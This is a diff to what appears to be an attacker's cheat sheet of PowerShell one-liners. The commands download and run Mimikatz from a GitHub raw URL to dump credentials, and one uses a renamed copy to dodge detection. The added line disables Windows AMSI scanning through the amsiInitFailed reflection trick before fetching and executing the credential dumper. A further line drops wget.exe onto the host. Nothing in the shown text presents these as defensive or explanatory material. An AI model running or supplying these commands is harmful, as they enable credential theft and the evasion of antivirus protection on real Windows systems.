@@ -12,6 +12,8 @@ powershell "IEX (New-Object Net.WebClient).DownloadString('file://C:/Users/Publi
 powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
 powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1'); Invoke-Mimiadios -DumpCreds
 
+powershell -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');Invoke-Mimiadios -DumpCreds
+
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/commercial/master/wget.exe', 'C:\Support\wget.exe') }"
 
 -------------------------------------------------------------------------------------------------------------------------------------
